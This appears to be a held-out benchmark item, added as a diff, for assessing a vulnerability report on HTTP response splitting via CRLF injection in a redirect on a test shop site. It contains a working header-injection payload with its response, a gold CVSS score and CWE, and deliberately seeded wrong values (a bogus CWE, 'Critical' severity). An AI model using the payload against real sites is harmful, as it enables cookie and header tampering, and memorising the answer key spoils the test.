@@ -1,0 +1,30 @@
+{
+  "id": "crlf-injection-headers",
+  "split": "heldout",
+  "title": "HTTP response splitting via CRLF injection in redirect",
+  "asset": "https://shop.acme.test/redirect",
+  "notes": "CRLF injection on GET /redirect?to=%0d%0aSet-Cookie:malicious=1 allows injecting arbitrary HTTP headers and writing responses (HTTP response splitting).",
+  "evidence": [
+    {
+      "name": "crlf-resp.txt",
+      "text": "GET /redirect?to=%0d%0aSet-Cookie:%20malicious=1 HTTP/1.1\nHost: shop.acme.test\n\nHTTP/1.1 302 Found\nLocation: \nSet-Cookie: malicious=1"
+    }
+  ],
+  "gold": {
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+    "cwe": [
+      "113"
+    ],
+    "cves": [],
+    "secrets": [],
+    "score": 6.1,
+    "severity": "Medium"
+  },
+  "faults": {
+    "cwe": "99999",
+    "severity_text": "Critical",
+    "fake_claim": true
+  },
+  "seeded_secrets": [],
+  "tool_output": ""
+}
